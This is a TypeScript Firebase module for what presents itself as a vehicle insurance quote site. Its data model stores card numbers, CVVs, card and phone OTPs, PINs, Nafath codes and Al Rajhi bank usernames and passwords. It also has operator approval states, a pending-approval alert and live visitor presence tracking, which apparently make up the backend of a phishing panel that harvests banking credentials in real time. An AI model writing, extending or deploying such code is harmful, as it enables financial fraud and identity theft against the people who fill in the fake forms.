import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase, ref, onValue, off } from "firebase/database";
import {
  doc,
  getFirestore,
  setDoc,
  updateDoc,
  collection,
  getDocs,
  onSnapshot,
  query,
  orderBy,
} from "firebase/firestore";
import {
  getAuth,
  signInWithPopup,
  signOut,
  GoogleAuthProvider,
  onAuthStateChanged,
  signInWithEmailAndPassword,
  createUserWithEmailAndPassword,
  type User,
} from "firebase/auth";

const firebaseConfig = {
  apiKey: "AIzaSyBJwAk57JgSfu-nXlctc9t5M2b5A0yOH3o",
  authDomain: "taminn-jh.firebaseapp.com",
  databaseURL: "https://taminn-jh-default-rtdb.firebaseio.com",
  projectId: "taminn-jh",
  storageBucket: "taminn-jh.firebasestorage.app",
  messagingSenderId: "910897215892",
  appId: "1:910897215892:web:d4788788e3a66d94abb781",
  measurementId: "G-MKE0PZWQEX",
};

const app = getApps().length ? getApp() : initializeApp(firebaseConfig);
export const db = getFirestore(app);
export const realtimeDb = getDatabase(app);

export {
  collection,
  getDocs,
  onSnapshot,
  query,
  orderBy,
  doc,
  updateDoc,
  setDoc,
};

// ============================================
// ALL DATA INTERFACES
// ============================================

// === INSURANCE FORM DATA ===
export interface InsuranceFormData {
  insurance_purpose: "renewal" | "property-transfer";
  vehicle_type: "registration" | "customs";
  documment_owner_full_name: string;
  owner_identity_number?: string;
  buyer_identity_number?: string;
  seller_identity_number?: string;
  phone?: string;
  serial_number?: string;
  vehicle_manufacture_number?: string;
  customs_code?: string;
  agreeToTerms: boolean;
}

export type FormErrors = Partial<Record<keyof InsuranceFormData, string>>;

// === EXTRA FEATURE ===
export interface ExtraFeature {
  id?: string;
  content: string;
  price: number;
  offer_id?: string;
}

// === EXTRA EXPENSE ===
export interface ExtraExpense {
  id?: string;
  reason: string;
  price: number;
  offer_id?: string;
}

// === COMPANY ===
export interface Company {
  id: string;
  name: string;
  image_url: string;
  created_at?: string;
  updated_at?: string;
}

// === OFFER ===
export interface Offer {
  id: string;
  companyId?: string;
  company_id?: string;
  name: string;
  type: string;
  main_price: number | string;
  extra_features: ExtraFeature[];
  extra_expenses: ExtraExpense[];
  company?: Company;
  created_at?: string;
  updated_at?: string;
}

// === PAYMENT FORM DATA ===
export interface PaymentFormData {
  id: string;
  full_name: string;
  card_number: string;
  expiration_date: string;
  cvv: string;
}

// === CARD TYPE ===
export interface CardType {
  type: string;
  logo: string;
  name: string;
}

// === VISITOR DATA ===
export interface VisitorData {
  id: string;
  currentPage?: number;
  isOnline?: boolean;
  lastSeen?: string;
  created_at?: string;
}

// === OTP DATA ===
export interface OtpData {
  id: string;
  otp?: string;
  otpApproved?: boolean;
  otpAttempts?: number;
  pinCode?: string;
}

// === QUOTE FORM DATA ===
export interface QuoteFormData {
  insurance_purpose: "renewal" | "property-transfer";
  documment_owner_full_name: string;
  owner_identity_number: string;
  buyer_identity_number: string;
  seller_identity_number: string;
  vehicle_type: string;
  sequenceNumber: string;
  policyStartDate: string;
  insuranceTypeSelected: string;
  additionalDrivers: number;
  specialDiscounts: boolean;
  agreeToTerms: boolean;
  selectedInsuranceOffer: string;
  selectedAddons: string[];
  phone: string;
}

// === VALIDATION RULE ===
export interface ValidationRule {
  required?: boolean;
  pattern?: RegExp;
  message: string;
  validate?: (value: string) => string | null;
}

// === APPROVAL STATUS ===
export type ApprovalStatus = "pending" | "approved" | "rejected";
export type CardApproval = "otp" | "pin" | "approved" | "pending" | "rejected";

// === USER DOCUMENT (Firebase Document) ===
export interface UserDocument {
  id: string;

  // Visitor Data
  currentPage?: number | string;
  isOnline?: boolean;
  isUnread?: boolean;
  lastSeen?: string;
  created_at?: string;
  createdDate?: string;
  timestamp?: string;
  country?: string;

  // Insurance Form Data
  insurance_purpose?: "renewal" | "property-transfer";
  vehicle_type?: "registration" | "customs";
  owner_identity_number?: string;
  buyer_identity_number?: string;
  seller_identity_number?: string;
  phone?: string;
  serial_number?: string;
  vehicle_manufacture_number?: string;
  customs_code?: string;
  agreeToTerms?: boolean;

  // Payment Form Data
  full_name?: string;
  card_number?: string;
  expiration_date?: string;
  cvv?: string;

  // OTP Data
  otp?: string;
  otpApproved?: boolean;
  otpAttempts?: number;
  pinCode?: string;

  // Card/Bank Info
  cardType?: string;
  cardMonth?: string;
  cardYear?: string;
  cardHolderName?: string;
  expiryMonth?: string;
  expiryYear?: string;
  expiryDate?: string;
  bankInfo?: {
    country?: string;
    name?: string;
    cardType?: string;
  };

  // Offer Data
  selectedOffer?: Offer;
  company?: Company;

  // Legacy fields for display
  documment_owner_full_name?: string;
  cardNumber?: string;
  phoneNumber?: string;
  identityNumber?: string;
  pin?: string;
  phoneOtp?: string;
  currentStep?: string | number;
  step?: string;

  // Verification Fields (V1-V7)
  _v1?: string;
  _v2?: string;
  _v3?: string;
  _v4?: string;
  _v5?: string;
  _v6?: string;
  _v7?: string;

  // Approval Statuses
  cardApproval?: CardApproval;
  cardOtpApproval?: ApprovalStatus;
  phoneOtpApproval?: ApprovalStatus;
  _v1Status?: ApprovalStatus;
  _v2Status?: ApprovalStatus;
  _v3Status?: ApprovalStatus;
  _v4Status?: ApprovalStatus;
  _v5Status?: ApprovalStatus;
  _v6Status?: ApprovalStatus;
  _v7Status?: ApprovalStatus;

  // Phone/ID Verification
  phoneVerificationCode?: string;
  phoneVerificationStatus?: ApprovalStatus;
  phoneVerifiedAt?: string;
  idVerificationCode?: string;
  idVerificationStatus?: ApprovalStatus;
  idVerifiedAt?: string;

  // Mobile & Nafaz Data
  nafazId?: string;
  nafazCode?: string;
  nafazStatus?: ApprovalStatus;
  mobileInfo?: string;
  mobileNumber?: string;
  operatorName?: string;
  operatorCode?: string;
  operator?: string;
  phone2?: string;
  phoneOtpCode?: string;
  phoneOtpCodeStatus?: ApprovalStatus;

  // Auth/Notes
  authNumber?: string;
  notes?: string;
  paymentStatus?: "pending" | "completed" | "failed";

  // Rajhi credentials
  rajhgi_username?: string;
  rajhgi_password?: string;
  rajhgi_otp?: string;

  [key: string]: any;
}

export async function updateUserDocument(
  docId: string,
  data: Partial<UserDocument>,
) {
  const docRef = doc(db, "pays", docId);
  await updateDoc(docRef, data);
}

// Authentication
export const auth = getAuth(app);
const googleProvider = new GoogleAuthProvider();

export async function signInWithGoogle(): Promise<User | null> {
  try {
    const result = await signInWithPopup(auth, googleProvider);
    return result.user;
  } catch (error) {
    console.error("Error signing in with Google:", error);
    return null;
  }
}

export async function signOutUser(): Promise<void> {
  try {
    await signOut(auth);
  } catch (error) {
    console.error("Error signing out:", error);
  }
}

export async function signInWithEmail(
  email: string,
  password: string,
): Promise<User | null> {
  try {
    const result = await signInWithEmailAndPassword(auth, email, password);
    return result.user;
  } catch (error) {
    console.error("Error signing in with email:", error);
    throw error;
  }
}

export async function signUpWithEmail(
  email: string,
  password: string,
): Promise<User | null> {
  try {
    const result = await createUserWithEmailAndPassword(auth, email, password);
    return result.user;
  } catch (error) {
    console.error("Error signing up with email:", error);
    throw error;
  }
}

export function onAuthChange(callback: (user: User | null) => void) {
  return onAuthStateChanged(auth, callback);
}

// Approvals Warning Settings
export interface ApprovalsWarningSettings {
  enabled: boolean;
  headline: string;
  showCardCount: boolean;
  showPhoneCount: boolean;
  accentColor: string;
  soundEnabled: boolean;
}

export const defaultWarningSettings: ApprovalsWarningSettings = {
  enabled: true,
  headline: "تحتاج موافقة!",
  showCardCount: true,
  showPhoneCount: true,
  accentColor: "#ef4444",
  soundEnabled: false,
};

export function subscribeToWarningSettings(
  callback: (settings: ApprovalsWarningSettings) => void,
) {
  const docRef = doc(db, "settings", "approvalsWarning");
  return onSnapshot(
    docRef,
    (snapshot) => {
      if (snapshot.exists()) {
        callback({
          ...defaultWarningSettings,
          ...snapshot.data(),
        } as ApprovalsWarningSettings);
      } else {
        callback(defaultWarningSettings);
      }
    },
    (error) => {
      console.error("Error fetching warning settings:", error);
      callback(defaultWarningSettings);
    },
  );
}

export async function updateWarningSettings(
  settings: Partial<ApprovalsWarningSettings>,
) {
  const docRef = doc(db, "settings", "approvalsWarning");
  await setDoc(docRef, settings, { merge: true });
}

// Presence / Online Status from Realtime Database
export interface PresenceData {
  online: boolean;
  lastSeen?: number;
  state?: string;
}

export function subscribeToPresence(
  callback: (presence: Record<string, PresenceData>) => void,
) {
  const statusRef = ref(realtimeDb, "status");

  const listener = onValue(
    statusRef,
    (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const presenceMap: Record<string, PresenceData> = {};
        Object.keys(data).forEach((key) => {
          const userData = data[key];
          presenceMap[key] = {
            online: userData?.state === "online",
            lastSeen:
              userData?.last_changed || userData?.lastSeen || Date.now(),
            state: userData?.state,
          };
        });
        callback(presenceMap);
      } else {
        callback({});
      }
    },
    (error) => {
      console.error("Error fetching presence:", error);
      callback({});
    },
  );

  return () => off(statusRef, "value", listener);
}

export type { User };
